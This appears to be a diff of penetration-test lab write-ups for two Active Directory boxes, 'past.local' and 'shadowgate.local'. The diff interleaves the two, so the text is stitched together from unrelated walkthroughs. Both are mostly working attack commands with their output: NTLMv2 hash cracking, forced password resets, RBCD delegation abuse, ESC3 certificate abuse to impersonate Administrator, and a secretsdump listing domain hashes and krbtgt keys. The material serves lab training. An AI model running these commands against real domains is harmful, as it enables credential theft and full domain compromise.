-drw-rw-rw-          0  Fri Jan 23 16:33:21 2026 past.local
-# cd past.local
-# ls
-drw-rw-rw-          0  Fri Jan 23 16:40:44 2026 .
-drw-rw-rw-          0  Fri Jan 23 16:40:44 2026 ..
-drw-rw-rw-          0  Sat Aug  1 16:21:02 2026 DfsrPrivate
-drw-rw-rw-          0  Fri Jan 23 16:33:21 2026 Policies
-drw-rw-rw-          0  Fri Jan 23 20:55:55 2026 scripts
-# cd scripts
-# ls
-drw-rw-rw-          0  Fri Jan 23 20:55:55 2026 .
-drw-rw-rw-          0  Fri Jan 23 20:55:55 2026 ..
--rw-rw-rw-        238  Fri Jan 23 20:55:55 2026 tyler_init.cmd
-# get tyler_init.cmd
-```
-
-```shellscript
-cat tyler_init.cmd
-@echo off
-REM Temporary dev helper - DO NOT REMOVE
-REM Tyler auto-login helper
-
-set TYLER_USER=tyler
-set TYLER_PASS=5rtfgvb%RTFGVB
-
-REM Fake ?use? of the vars so it looks intentional
-echo Initializing dev environment for %TYLER_USER%...
+```bash
+john --format=netntlmv2 --wordlist=/usr/share/wordlists/rockyou.txt bogdan.hash 
+Using default input encoding: UTF-8
+Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+bogdan0126       (bogdan.r)     
+1g 0:00:00:05 DONE (2026-08-03 01:57) 0.1915g/s 1827Kp/s 1827Kc/s 1827KC/s boiadee..bog625sulk115
+Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
+Session completed.
 ```
 
 # Foothold
 
 Research findings, data insights, and key considerations and document how you got a foothold on the vulnerable box
 
-```shellscript expandable
-Past impacket-getTGT 'past.local/tyler:5rtfgvb%RTFGVB' -dc-ip EC2AMAZ-A5O4OL8.past.local
-Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
+```bash
+nxc smb 10.0.30.30 -u 'bogdan.r' -p 'bogdan0126'         
+SMB         10.0.30.30      445    SG-DC01          [*] Windows 10 / Server 2019 Build 17763 x64 (name:SG-DC01) (domain:shadowgate.local) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.0.30.30      445    SG-DC01          [+] shadowgate.local\bogdan.r:bogdan0126 
 
-[*] Saving ticket in tyler.ccache
-➜  Past export KRB5CCNAME=tyler.ccache
-➜  Past nxc smb 10.0.20.184 -u 'tyler' -k --use-kcache
-SMB         10.0.20.184     445    EC2AMAZ-A5O4OL8  [*] Windows Server 2016 Datacenter 14393 x64 (name:EC2AMAZ-A5O4OL8) (domain:past.local) (signing:True) (SMBv1:True) (Null Auth:True)
-SMB         10.0.20.184     445    EC2AMAZ-A5O4OL8  [+] PAST.LOCAL\tyler from ccache
-➜  Past nxc smb 10.0.20.184 -u 'tyler' -k --use-kcache --users
-SMB         10.0.20.184     445    EC2AMAZ-A5O4OL8  [*] Windows Server 2016 Datacenter 14393 x64 (name:EC2AMAZ-A5O4OL8) (domain:past.local) (signing:True) (SMBv1:True) (Null Auth:True)
-SMB         10.0.20.184     445    EC2AMAZ-A5O4OL8  [+] PAST.LOCAL\tyler from ccache
-SMB         10.0.20.184     445    EC2AMAZ-A5O4OL8  -Username-                    -Last PW Set-       -BadPW- -Description-
-SMB         10.0.20.184     445    EC2AMAZ-A5O4OL8  Administrator                 2026-01-24 19:22:42 0       Built-in account for administering the computer/domain
-SMB         10.0.20.184     445    EC2AMAZ-A5O4OL8  Guest                         <never>             0       Built-in account for guest access tothe computer/domain
-SMB         10.0.20.184     445    EC2AMAZ-A5O4OL8  krbtgt                        2026-01-23 21:35:10 0       Key Distribution Center Service Account
-SMB         10.0.20.184     445    EC2AMAZ-A5O4OL8  DefaultAccount                <never>             0       A user account managed by the system.
-SMB         10.0.20.184     445    EC2AMAZ-A5O4OL8  tyler                         2026-01-24 02:05:55 0
-SMB         10.0.20.184     445    EC2AMAZ-A5O4OL8  ryan                          2026-01-24 19:24:46 0
-SMB         10.0.20.184     445    EC2AMAZ-A5O4OL8  [*] Enumerated 6 local users: PAST
+nxc winrm 10.0.30.30 -u 'bogdan.r' -p 'bogdan0126'
+WINRM       10.0.30.30      5985   SG-DC01          [*] Windows 10 / Server 2019 Build 17763 (name:SG-DC01) (domain:shadowgate.local) 
+WINRM       10.0.30.30      5985   SG-DC01          [+] shadowgate.local\bogdan.r:bogdan0126 (Pwn3d!)
 ```
 
-<Frame>
-  ![Image](/images/image-27.png "Image")
-</Frame>
+No `flag` on `bogdan.r` desktop, so there would be another way
 
-```shellscript
-bloodyAD --host EC2AMAZ-A5O4OL8.past.local -d past.local -u tyler -k add computer 'HACKERMANN' 'Valentino1@'
-[+] HACKERMANN$ created
-➜  Past bloodyAD --host EC2AMAZ-A5O4OL8.past.local -d past.local -u tyler -k add rbcd 'EC2AMAZ-A5O4OL8$' 'HACKERMANN$'
-[+] HACKERMANN$ can now impersonate users on EC2AMAZ-A5O4OL8$ via S4U2Proxy
-[+] e.g. badS4U2proxy 'kerberos+ccache://past.local\tyler:tyler.ccache@EC2AMAZ-A5O4OL8.past.local/?serverip=10.0.20.184&dc=10.0.20.184' 'HOST/EC2AMAZ-A5O4OL8$@past.local' 'Administrator@past.local'
+```bash
+evil-winrm -i 10.0.30.30 -u 'bogdan.r' -p 'bogdan0126' 
+                                        
+Evil-WinRM shell v3.9
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\bogdan.r\Documents> dir
+*Evil-WinRM* PS C:\Users\bogdan.r\Documents> cd ..
+*Evil-WinRM* PS C:\Users\bogdan.r> cd Desktop
+*Evil-WinRM* PS C:\Users\bogdan.r\Desktop> dir
 ```
 
-```shellscript expandable
-mpacket-getST -spn 'cifs/EC2AMAZ-A5O4OL8.past.local' -impersonate 'Administrator' 'past.local/HACKERMANN$:Valentino1@'
-Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
+### Generic-All (Force Password Change)
 
-[-] CCache file is not found. Skipping...
-[*] Getting TGT for user
-[*] Impersonating Administrator
-/usr/share/doc/python3-impacket/examples/getST.py:380: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in afuture version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
-now = datetime.datetime.utcnow()
-/usr/share/doc/python3-impacket/examples/getST.py:477: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in afuture version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
-now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
-[*] Requesting S4U2self
-/usr/share/doc/python3-impacket/examples/getST.py:607: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in afuture version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
-now = datetime.datetime.utcnow()
-/usr/share/doc/python3-impacket/examples/getST.py:659: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in afuture version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
-now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
-[*] Requesting S4U2Proxy
-[*] Saving ticket in Administrator@cifs_EC2AMAZ-A5O4OL8.past.local@PAST.LOCAL.ccache
+```bash
+net rpc password "oscar.m" "Valentino1@" -U "shadowgate.local"/"bogdan.r"%"bogdan0126" -S "10.0.30.30"
+
+OR
+
+bloodyad --host 10.0.30.30 -d shadowgate.local -u bogdan.r -p 'bogdan0126' set password 'oscar.m' 'Valentino1@'
+[+] Password changed successfully!
 ```
 
-```text
-export KRB5CCNAME=Administrator@cifs_EC2AMAZ-A5O4OL8.past.local@PAST.LOCAL.ccache
+But I get this. `STATUS_INVALID_LOGON_HOURS`
+
+```bash
+nxc smb 10.0.30.30 -u 'oscar.m' -p "Valentino1@"
+SMB         10.0.30.30      445    SG-DC01          [*] Windows 10 / Server 2019 Build 17763 x64 (name:SG-DC01) (domain:shadowgate.local) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.0.30.30      445    SG-DC01          [-] shadowgate.local\oscar.m:Valentino1@ STATUS_INVALID_LOGON_HOURS
 ```
 
-```shellscript
-nxc smb 10.0.20.184 -u 'Administrator' -k --use-kcache
-SMB         10.0.20.184     445    EC2AMAZ-A5O4OL8  [*] Windows Server 2016 Datacenter 14393 x64 (name:EC2AMAZ-A5O4OL8) (domain:past.local) (signing:True) (SMBv1:True) (Null Auth:True)
-SMB         10.0.20.184     445    EC2AMAZ-A5O4OL8  [+] past.local\Administrator from ccache (Pwn3d!)
+You can clear it off using `bloodyad` set object command
+
+```bash
+bloodyad --host SG-DC01.shadowgate.local -d shadowgate.local -u bogdan.r -p 'bogdan0126' set object oscar.m logonHours 
+[!] Attribute encoding not supported for logonHours with bytes attribute type, using raw mode
+[+] oscar.m's logonHours has been updated
+
+nxc smb 10.0.30.30 -u 'oscar.m' -p "Valentino1@"
+SMB         10.0.30.30      445    SG-DC01          [*] Windows 10 / Server 2019 Build 17763 x64 (name:SG-DC01) (domain:shadowgate.local) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.0.30.30      445    SG-DC01          [+] shadowgate.local\oscar.m:Valentino1@ 
+```
+
+### User flag
+
+```jsx
+evil-winrm -i 10.0.30.30 -u 'oscar.m' -p 'Valentino1@'  
+                                        
+Evil-WinRM shell v3.9
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\oscar.m\Documents> dir
+*Evil-WinRM* PS C:\Users\oscar.m\Documents> cd ..
+*Evil-WinRM* PS C:\Users\oscar.m> cd Desktop
+*Evil-WinRM* PS C:\Users\oscar.m\Desktop> dir
+
+    Directory: C:\Users\oscar.m\Desktop
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----        12/4/2025   1:03 PM           6553 user.txt
+
+*Evil-WinRM* PS C:\Users\oscar.m\Desktop> type user.txt
+
+FLAG[shadowgate_user_integrity_breach_7f2c]
+```
+
+### **Writable Objects**
+
+```jsx expandable
+bloodyad --host SG-DC01.shadowgate.local -d shadowgate.local -u oscar.m -p 'Valentino1@' get writable --detail 
+
+distinguishedName: CN=Users,DC=shadowgate,DC=local
+user: CREATE_CHILD
+
+distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=shadowgate,DC=local
+url: WRITE
+wWWHomePage: WRITE
+
+distinguishedName: CN=oscar.m,CN=Users,DC=shadowgate,DC=local
+thumbnailPhoto: WRITE
+pager: WRITE
+mobile: WRITE
+homePhone: WRITE
+userSMIMECertificate: WRITE
+
+<< snip >>
+
+distinguishedName: CN=sam.h\0ADEL:c9316c03-4a09-4d46-9db0-f45925e154f1,CN=Deleted Objects,DC=shadowgate,DC=local
+ms-net-ieee-80211-GroupPolicy: CREATE_CHILD
+nTFRSSubscriptions: CREATE_CHILD
+classStore: CREATE_CHILD
+ms-net-ieee-8023-GroupPolicy: CREATE_CHILD
+
+<< snip >>
+
+distinguishedName: DC=shadowgate.local,CN=MicrosoftDNS,DC=DomainDnsZones,DC=shadowgate,DC=local
+dnsNode: CREATE_CHILD
+dnsZoneScopeContainer: CREATE_CHILD
+
+distinguishedName: DC=_msdcs.shadowgate.local,CN=MicrosoftDNS,DC=ForestDnsZones,DC=shadowgate,DC=local
+dnsNode: CREATE_CHILD
+dnsZoneScopeContainer: CREATE_CHILD
+```
+
+### Restored deleted Object
+
+```agda
+Shadowgate2 bloodyad --host SG-DC01.shadowgate.local -d shadowgate.local -u oscar.m -p 'Valentino1@' set restore sam.h          
+[+] sam.h has been restored successfully under CN=sam.h,CN=Users,DC=shadowgate,DC=local
+```
+
+### Change Password for Recovered User
+
+```agda
+bloodyad --host SG-DC01.shadowgate.local -d shadowgate.local -u oscar.m -p 'Valentino1@' set password 'sam.h' 'Valentino1@'
+[+] Password changed successfully!
+```
+
+## BloodHound Data for Sam.h (Recovered User)
+
+```jsx
+bloodyad --host SG-DC01.shadowgate.local -d shadowgate.local -u sam.h -p 'Valentino1@' get bloodhound               
+[+] Connecting to LDAP server
+[+] Connected to LDAP serrver
+Dumping schema: 2it [00:00, 30.40it/s]
+Generating lookuptable: 87it [00:00, 419.43it/s]
+Dumping SDs: 100%|███████████████████████████████████████████████████████████████████████████████████████████████████████| 91/91 [00:01<00:00, 56.34it/s]
+Dumping domains: 100%|█████████████████████████████████████████████████████████████████████████████████████████████████████| 1/1 [00:00<00:00, 19.18it/s]
+Dumping users: 100%|████████████████████████████████████████████████████████████████████████████████████████████████████| 11/11 [00:00<00:00, 344.15it/s]
+Dumping computers: 100%|███████████████████████████████████████████████████████████████████████████████████████████████████| 1/1 [00:00<00:00, 48.31it/s]
+Dumping groups: 100%|██████████████████████████████████████████████████████████████████████████████████████████████████| 52/52 [00:00<00:00, 1058.62it/s]
+Dumping GPOs: 100%|████████████████████████████████████████████████████████████████████████████████████████████████████████| 2/2 [00:00<00:00, 87.15it/s]
+Dumping OUs: 100%|█████████████████████████████████████████████████████████████████████████████████████████████████████████| 1/1 [00:00<00:00, 59.78it/s]
+Dumping Containers: 100%|███████████████████████████████████████████████████████████████████████████████████████████████| 19/19 [00:00<00:00, 384.08it/s]
+[+] Bloodhound data saved to 20260803T065050_Bloodhound.zip
+[+] Found 0 trusts
+```
+
+```jsx
+certipy-ad find -u 'sam.h@shadowgate.local' -p 'Valentino1@' -dc-ip 10.0.30.30 -target SG-DC01.shadowgate.local -vulnerable -debug -ldap-scheme ldap  
+Certipy v5.1.0 - by Oliver Lyak (ly4k)
+
+[+] Nameserver: '10.0.30.30'
+[+] DC IP: '10.0.30.30'
+[+] DC Host: 'SG-DC01.shadowgate.local'
+[+] Target IP: '10.0.30.30'
+[+] Remote Name: 'SG-DC01.shadowgate.local'
+[+] Domain: 'SHADOWGATE.LOCAL'
+[+] Username: 'SAM.H'
+[+] Authenticating to LDAP server using NTLM authentication
+[+] Using NTLM signing: True (LDAP signing: True, SSL: False)
+[+] Using channel binding signing: False (LDAP channel binding: True, SSL: False)
+[+] LDAP NTLM authentication successful
+[+] Bound to ldap://10.0.30.30:389 - cleartext
+[+] Default path: DC=shadowgate,DC=local
+[+] Configuration path: CN=Configuration,DC=shadowgate,DC=local
+[+] Adding 'Domain Users' and 'Domain Computers' to list of current user's SIDs
+[+] User 'SAM.H' has 6 SIDs:
+[+]   S-1-5-21-2396436576-3267128377-3646372360-1114
+[+]   S-1-5-11
+[+]   S-1-5-32-545
+[+]   S-1-5-21-2396436576-3267128377-3646372360-513
+[+]   S-1-5-21-2396436576-3267128377-3646372360-515
+[+]   S-1-1-0
+[+] List of current user's SIDs:
+     SHADOWGATE.LOCAL\sam.h (S-1-5-21-2396436576-3267128377-3646372360-1114)
+     SHADOWGATE.LOCAL\Authenticated Users (SHADOWGATE.LOCAL-S-1-5-11)
+     SHADOWGATE.LOCAL\Users (SHADOWGATE.LOCAL-S-1-5-32-545)
+     SHADOWGATE.LOCAL\Domain Users (S-1-5-21-2396436576-3267128377-3646372360-513)
+     SHADOWGATE.LOCAL\Domain Computers (S-1-5-21-2396436576-3267128377-3646372360-515)
+     SHADOWGATE.LOCAL\Everyone (SHADOWGATE.LOCAL-S-1-1-0)
+[*] Finding certificate templates
+[*] Found 34 certificate templates
+[*] Finding certificate authorities
+[*] Found 1 certificate authority
+[*] Found 12 enabled certificate templates
+[*] Finding issuance policies
+[*] Found 15 issuance policies
+[*] Found 0 OIDs linked to templates
+[+] Trying to resolve 'SG-DC01.shadowgate.local' at '10.0.30.30'
+[*] Retrieving CA configuration for 'Shadowgate-CA' via RRP
+[!] Failed to connect to remote registry. Service should be starting now. Trying again...
+[+] Connected to remote registry at 'SG-DC01.shadowgate.local' ('10.0.30.30')
+[*] Successfully retrieved CA configuration for 'Shadowgate-CA'
+[*] Checking web enrollment for CA 'Shadowgate-CA' @ 'SG-DC01.shadowgate.local'
+[+] Resolved 'SG-DC01.shadowgate.local' from cache: 10.0.30.30
+[+] Connecting to 'http://10.0.30.30/certsrv/'
+[+] Resolved 'SG-DC01.shadowgate.local' from cache: 10.0.30.30
+[+] Connecting to 'https://10.0.30.30/certsrv/'
+[!] Error checking web enrollment: timed out
+
+httpx.ConnectTimeout: timed out
+[*] Saving text output to '20260803031632_Certipy.txt'
+[+] Attempting to write data to '20260803031632_Certipy.txt'
+[+] Data written to '20260803031632_Certipy.txt'
+[*] Wrote text output to '20260803031632_Certipy.txt'
+[*] Saving JSON output to '20260803031632_Certipy.json'
+[+] Attempting to write data to '20260803031632_Certipy.json'
+[+] Data written to '20260803031632_Certipy.json'
+[*] Wrote JSON output to '20260803031632_Certipy.json'
+```
+
+Both vulnerable to `ESC7` and `ESC3`
+
+```jsx
+cat 20260803031632_Certipy.json          
+{
+  "Certificate Authorities": {
+    "0": {
+      "CA Name": "Shadowgate-CA",
+      "DNS Name": "SG-DC01.shadowgate.local",
+      "Certificate Subject": "CN=Shadowgate-CA, DC=shadowgate, DC=local",
+      "Certificate Serial Number": "3DADB967D3C30DB94A9620C07D4332B0",
+      "Certificate Validity Start": "2025-12-07 17:37:04+00:00",
+      "Certificate Validity End": "2124-12-07 17:47:04+00:00",
+      "Web Enrollment": {
+        "http": {
+          "enabled": false
+        },
+        "https": {
+          "enabled": false,
+          "channel_binding": null
+        }
+      },
+      "User Specified SAN": "Disabled",
+      "Request Disposition": "Issue",
+      "Enforce Encryption for Requests": "Enabled",
+      "Active Policy": "CertificateAuthority_MicrosoftDefault.Policy",
+      "Permissions": {
+        "Owner": "SHADOWGATE.LOCAL\\Administrators",
+        "Access Rights": {
+          "512": [
+            "SHADOWGATE.LOCAL\\Authenticated Users",
+            "SHADOWGATE.LOCAL\\sam.h"
+          ],
+          "1": [
+            "SHADOWGATE.LOCAL\\Domain Admins",
+            "SHADOWGATE.LOCAL\\Enterprise Admins",
+            "SHADOWGATE.LOCAL\\Administrators",
+            "SHADOWGATE.LOCAL\\sam.h"
+          ],
+          "2": [
+            "SHADOWGATE.LOCAL\\Domain Admins",
+            "SHADOWGATE.LOCAL\\Enterprise Admins",
+            "SHADOWGATE.LOCAL\\Administrators"
+          ],
+          "256": [
+            "SHADOWGATE.LOCAL\\sam.h"
+          ]
+        }
+      },
+      "[+] User Enrollable Principals": [
+        "SHADOWGATE.LOCAL\\Authenticated Users",
+        "SHADOWGATE.LOCAL\\sam.h"
+      ],
+      "[+] User ACL Principals": [
+        "SHADOWGATE.LOCAL\\sam.h"
+      ],
+      "[!] Vulnerabilities": {
+        "ESC7": "User has dangerous permissions."
+      }
+    }
+  },
+  "Certificate Templates": {
+    "0": {
+      "Template Name": "Shadowgate-EnrollmentAgent",
+      "Display Name": "Shadowgate-EnrollmentAgent",
+      "Certificate Authorities": [
+        "Shadowgate-CA"
+      ],
+      "Enabled": true,
+      "Client Authentication": false,
+      "Enrollment Agent": true,
+      "Any Purpose": false,
+      "Enrollee Supplies Subject": false,
+      "Certificate Name Flag": [
+        33554432,
+        2147483648
+      ],
+      "Enrollment Flag": [
+        32
+      ],
+      "Private Key Flag": [
+        16
+      ],
+      "Extended Key Usage": [
+        "Certificate Request Agent"
+      ],
+      "Requires Manager Approval": false,
+      "Requires Key Archival": false,
+      "Authorized Signatures Required": 0,
+      "Schema Version": 2,
+      "Validity Period": "2 years",
+      "Renewal Period": "6 weeks",
+      "Minimum RSA Key Length": 2048,
+      "Template Created": "2025-12-07 17:51:15+00:00",
+      "Template Last Modified": "2025-12-07 17:51:19+00:00",
+      "Permissions": {
+        "Enrollment Permissions": {
+          "Enrollment Rights": [
+            "SHADOWGATE.LOCAL\\sam.h",
+            "SHADOWGATE.LOCAL\\Domain Admins",
+            "SHADOWGATE.LOCAL\\Enterprise Admins"
+          ]
+        },
+        "Object Control Permissions": {
+          "Owner": "SHADOWGATE.LOCAL\\Administrator",
+          "Full Control Principals": [
+            "SHADOWGATE.LOCAL\\Domain Admins",
+            "SHADOWGATE.LOCAL\\Enterprise Admins"
+          ],
+          "Write Owner Principals": [
+            "SHADOWGATE.LOCAL\\Domain Admins",
+            "SHADOWGATE.LOCAL\\Enterprise Admins"
+          ],
+          "Write Dacl Principals": [
+            "SHADOWGATE.LOCAL\\Domain Admins",
+            "SHADOWGATE.LOCAL\\Enterprise Admins"
+          ],
+          "Write Property Enroll": [
+            "SHADOWGATE.LOCAL\\Domain Admins",
+            "SHADOWGATE.LOCAL\\Enterprise Admins"
+          ]
+        }
+      },
+      "[+] User Enrollable Principals": [
+        "SHADOWGATE.LOCAL\\sam.h"
+      ],
+      "[!] Vulnerabilities": {
+        "ESC3": "Template has Certificate Request Agent EKU set."
+      }
+    }
+  }
+}% 
+```
+
+If you are having issues use `-k`
+
+```jsx
+certipy-ad req \       
+    -u 'sam.h@shadowgate.local' -p 'Valentino1@' \
+    -dc-ip '10.0.30.30' -target 'SG-DC01.shadowgate.local' \
+    -ca 'Shadowgate-CA' -template 'Shadowgate-EnrollmentAgent' -ldap-scheme ldap -debug -k
+Certipy v5.1.0 - by Oliver Lyak (ly4k)
+
+[!] KRB5CCNAME environment variable not set
+[!] DC host (-dc-host) not specified and Kerberos authentication is used. This might fail
+[+] DC host (-dc-host) not specified. Using domain as DC host
+[+] Nameserver: '10.0.30.30'
+[+] DC IP: '10.0.30.30'
+[+] DC Host: 'SHADOWGATE.LOCAL'
+[+] Target IP: None
+[+] Remote Name: 'SG-DC01.shadowgate.local'
+[+] Domain: 'SHADOWGATE.LOCAL'
+[+] Username: 'SAM.H'
+[+] Trying to resolve 'SG-DC01.shadowgate.local' at '10.0.30.30'
+[+] Generating RSA key
+[*] Requesting certificate via RPC
+[+] Checking for Kerberos ticket cache
+[+] Getting TGT for 'SAM.H'@'SHADOWGATE.LOCAL'
+[+] Got TGT for 'SAM.H'@'SHADOWGATE.LOCAL'
+[+] Getting TGS for 'HOST/SG-DC01.shadowgate.local'
+[+] Got TGS for 'HOST/SG-DC01.shadowgate.local'
+[+] Trying to connect to endpoint: ncacn_np:10.0.30.30[\pipe\cert]
+[+] Connected to endpoint: ncacn_np:10.0.30.30[\pipe\cert]
+[*] Request ID is 7
+[*] Successfully requested certificate
+[*] Got certificate with UPN 'sam.h@shadowgate.local'
+[+] Found SID in security extension: 'S-1-5-21-2396436576-3267128377-3646372360-1114'
+[*] Certificate object SID is 'S-1-5-21-2396436576-3267128377-3646372360-1114'
+[*] Saving certificate and private key to 'sam.h.pfx'
+[+] Attempting to write data to 'sam.h.pfx'
+[+] Data written to 'sam.h.pfx'
+[*] Wrote certificate and private key to 'sam.h.pfx'
+```
+
+```jsx
+certipy-ad req \ 
+    -u 'sam.h@shadowgate.local' -p 'Valentino1@' \
+    -dc-ip '10.0.30.30' -target 'SG-DC01.shadowgate.local' \
+    -ca 'Shadowgate-CA' -template 'User' \
+    -on-behalf-of 'SHADOWGATE\Administrator' \
+    -pfx 'sam.h.pfx' -ldap-scheme ldap -debug -k
+Certipy v5.1.0 - by Oliver Lyak (ly4k)
+
+[!] KRB5CCNAME environment variable not set
+[!] DC host (-dc-host) not specified and Kerberos authentication is used. This might fail
+[+] DC host (-dc-host) not specified. Using domain as DC host
+[+] Nameserver: '10.0.30.30'
+[+] DC IP: '10.0.30.30'
+[+] DC Host: 'SHADOWGATE.LOCAL'
+[+] Target IP: None
+[+] Remote Name: 'SG-DC01.shadowgate.local'
+[+] Domain: 'SHADOWGATE.LOCAL'
+[+] Username: 'SAM.H'
+[+] Trying to resolve 'SG-DC01.shadowgate.local' at '10.0.30.30'
+[+] Generating RSA key
+[*] Requesting certificate via RPC
+[+] Checking for Kerberos ticket cache
+[+] Getting TGT for 'SAM.H'@'SHADOWGATE.LOCAL'
+[+] Got TGT for 'SAM.H'@'SHADOWGATE.LOCAL'
+[+] Getting TGS for 'HOST/SG-DC01.shadowgate.local'
+[+] Got TGS for 'HOST/SG-DC01.shadowgate.local'
+[+] Trying to connect to endpoint: ncacn_np:10.0.30.30[\pipe\cert]
+[+] Connected to endpoint: ncacn_np:10.0.30.30[\pipe\cert]
+[*] Request ID is 8
+[*] Successfully requested certificate
+[*] Got certificate with UPN 'Administrator@shadowgate.local'
+[+] Found SID in security extension: 'S-1-5-21-2396436576-3267128377-3646372360-500'
+[*] Certificate object SID is 'S-1-5-21-2396436576-3267128377-3646372360-500'
+[*] Saving certificate and private key to 'administrator.pfx'
+[+] Attempting to write data to 'administrator.pfx'
+[+] Data written to 'administrator.pfx'
+[*] Wrote certificate and private key to 'administrator.pfx'
 ```
 
 # Privilege Escalation
 
 Document how you were able to more laterally and gain a higher privilege
 
-```shellscript expandable
-secretsdump.py -k -no-pass past.local/Administrator@EC2AMAZ-A5O4OL8.past.local
-Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies
+### Getting Administrator.pfx
 
-[*] Service RemoteRegistry is in stopped state
-[*] Starting service RemoteRegistry
-[*] Target system bootKey: 0x57dac43549d5335a785c5d33ad66dd24
-[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
-Administrator:500:aad3b435b51404eeaad3b435b51404ee:31592a42841d0a9e74f93c41d8884cd0:::
-Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
-DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
-[*] Dumping cached domain logon information (domain/username:hash)
-[*] Dumping LSA Secrets
-[*] $MACHINE.ACC
-PAST\EC2AMAZ-A5O4OL8$:aes256-cts-hmac-sha1-96:d777798e44de2f5c3b1f24b04e6b87afa6254cddc102a1b7a165aeebdc0f3ff2
-PAST\EC2AMAZ-A5O4OL8$:aes128-cts-hmac-sha1-96:21526e717387880866a5b3a6b3e51f7a
-PAST\EC2AMAZ-A5O4OL8$:des-cbc-md5:83040d73ad0e0702
-PAST\EC2AMAZ-A5O4OL8$:plain_password_hex:ef435c015452133c3b427837a54020cc1d2f685144c01f652204a5879848b4c67406cd6136af54b0c38b3e7e8bc6693cc2aa4416c1599e7035bc9c5a6e26447dc25fd62c137d861777d68dd6d79a0af3e3bf5d56752239d35e2be7228e2a175f0adbefcb15a2a966a91b6e2f1cd99f3ef78db5a178ec0fad469080315c18b8b70367f5a0acb04e1dee6bbba19735d97a4011de2b7497852b60c2594694772f40ae7bd117e9e4784a80fc8f12856a01fb2a6964ac157a6bdaf9f6b05962005c2df989f11e0deeb2acd90f1d3d9d890293b5beb9c29195662bd65b89f6036a49c4479b1081a2c482f22ad3bba0bb22b69e
-PAST\EC2AMAZ-A5O4OL8$:aad3b435b51404eeaad3b435b51404ee:cf905e7d382b3519890fa86258aad61c:::
-[*] DPAPI_SYSTEM
-dpapi_machinekey:0x4788c727bb5ebb6ffeecfffbc42e3dc0bb950bbb
-dpapi_userkey:0x7439eb735d5612ad03cb1adf5b0bc31c5211e273
-[*] NL$KM
-0000   2E 74 ED 55 62 CB 0C 23  83 3D C6 56 51 CE B2 93   .t.Ub..#.=.VQ...
-0010   63 BC 5F C9 59 8B 25 DB  1F FC F9 A2 26 50 31 60   c._.Y.%.....&P1`
-0020   C4 67 C4 47 3B EA D7 01  86 9B 67 31 70 F9 30 A1   .g.G;.....g1p.0.
-0030   49 99 F2 29 6D 19 85 D4  F2 01 BE C0 65 26 19 20   I..)m.......e&.
-NL$KM:2e74ed5562cb0c23833dc65651ceb29363bc5fc9598b25db1ffcf9a226503160c467c4473bead701869b673170f930a14999f2296d1985d4f201bec065261920
-[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
-[*] Using the DRSUAPI method to get NTDS.DIT secrets
-Administrator:500:aad3b435b51404eeaad3b435b51404ee:31592a42841d0a9e74f93c41d8884cd0:::
-Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
-krbtgt:502:aad3b435b51404eeaad3b435b51404ee:32f98a0286334443b0602bb33a85b2a1:::
-DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
-tyler:1008:aad3b435b51404eeaad3b435b51404ee:b3beb663d0d8462f9d1360551097f207:::
-ryan:1121:aad3b435b51404eeaad3b435b51404ee:9fc394f5e404de90c2187b8e0ef9a794:::
-EC2AMAZ-A5O4OL8$:1009:aad3b435b51404eeaad3b435b51404ee:cf905e7d382b3519890fa86258aad61c:::
-APPDEV01$:1115:aad3b435b51404eeaad3b435b51404ee:217e50203a5aba59cefa863c724bf61b:::
-WEBDEV01$:1116:aad3b435b51404eeaad3b435b51404ee:94a0c26018712ec93b70da06cf7274b3:::
-DEV01$:1117:aad3b435b51404eeaad3b435b51404ee:4aa669fbcaefdaede473f912ef7ce04b:::
-HACKERMANN$:1610:aad3b435b51404eeaad3b435b51404ee:8198a0b3f22a084be8867cf6b50dd24a:::
-[*] Kerberos keys grabbed
-Administrator:aes256-cts-hmac-sha1-96:e23adabad14da2aca9729faefd65add5965c40c28e5328b96db04aefb357339d
-Administrator:aes128-cts-hmac-sha1-96:a55df42834588446919da99527f9dd52
-Administrator:des-cbc-md5:801543864ad50ec2
-krbtgt:aes256-cts-hmac-sha1-96:d3e4986f3ad4b9dbe0f1056f84caf1543244d093890c0e1b9e392761983ae610
-krbtgt:aes128-cts-hmac-sha1-96:ef2b9dbab1be9ed28d0f5708865b76ae
